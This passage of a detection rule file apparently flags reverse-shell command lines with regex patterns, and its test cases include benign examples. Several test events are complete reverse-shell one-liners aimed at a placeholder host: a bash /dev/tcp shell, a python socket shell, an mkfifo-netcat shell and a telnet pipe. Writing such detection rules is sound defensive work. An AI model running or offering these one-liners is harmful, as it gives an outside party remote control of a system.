      - {field: command_line, regex: 'bash\s+-i\s{0,3}>&?\s{0,3}/dev/tcp'}
      - {field: command_line, regex: '(python\d?|perl|ruby|php|lua)\s+-[a-z]\s.{0,200}(socket|fsockopen|TCPSocket|IO\.popen).{0,200}(/bin/(ba)?sh|cmd|exec|dup2|subprocess|spawn|pty)'}
      - {field: command_line, regex: 'mkfifo\s+\S{1,40}.{0,60}(nc|ncat|netcat|/bin/sh|telnet)'}
      - {field: command_line, regex: 'telnet\s+\S{1,60}\s+\d{2,5}\s{0,3}\|\s{0,3}(/bin/)?(ba|z|da)?sh\b'}
      - {field: command_line, regex: 'socat\s.{0,60}(exec|system):.{0,40}(/bin/(ba)?sh|cmd)'}
      - {field: command_line, regex: 'openssl\s+s_client\s.{0,40}-connect.{0,80}(/bin/(ba)?sh|mkfifo)'}
      - {field: command_line, regex: 'new-object\s+(system\.)?net\.sockets\.tcpclient.{0,200}(getstream|invoke-expression|iex|\.read\()'}
      # any binary (renamed netcat, busybox nc, a custom helper) handed a shell with -e/-c plus a host and numeric port
      - {field: command_line, regex: '(?:^|[\s/\\])\S{1,40}\s.{0,40}\b(?:\d{1,3}\.){3}\d{1,3}\s{1,3}\d{2,5}\b.{0,30}\s-(?:e|c)\s{1,3}\S{0,12}(?:sh|bash|dash|zsh|cmd|cmd\.exe|powershell)\b'}
      - {field: command_line, regex: '(?:^|[\s/\\])\S{1,40}\s(?:.{0,20}\s)?-(?:e|c)\s{1,3}\S{0,12}(?:sh|bash|dash|zsh|cmd|cmd\.exe|powershell)\b.{0,30}\s(?:\d{1,3}\.){3}\d{1,3}\s{1,3}\d{2,5}\b'}
  tests:
    - {event: {command_line: "bash -c 'bash -i >& /dev/tcp/198.51.100.7/4444 0>&1'"}, expect_match: true}
    - {name: renamed netcat, event: {command_line: 'svc-helper 198.51.100.7 4444 -e /bin/sh'}, expect_match: true}
    - {name: flag first, event: {command_line: 'helper.exe -e cmd.exe 198.51.100.7 9001'}, expect_match: true}
    - {name: ssh with remote command is not a reverse shell, event: {command_line: 'ssh -p 2222 deploy@10.0.0.5 -c aes256-ctr'}, expect_match: false}
    - {name: sh -c with a local command, event: {command_line: 'sh -c /usr/local/bin/backup.sh'}, expect_match: false}
    - {event: {command_line: "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"198.51.100.7\",4444));os.dup2(s.fileno(),0);subprocess.call([\"/bin/sh\",\"-i\"])'"}, expect_match: true}
    - {event: {command_line: 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 198.51.100.7 4444 >/tmp/f'}, expect_match: true}
    - {event: {command_line: 'nc -zv 10.0.0.5 22'}, expect_match: false}
    - {name: telnet pipe, event: {command_line: 'telnet 198.51.100.7 4444 | /bin/bash | telnet 198.51.100.7 4445'}, expect_match: true}
    - {name: interactive telnet to a switch, event: {command_line: 'telnet switch-01 23'}, expect_match: false}

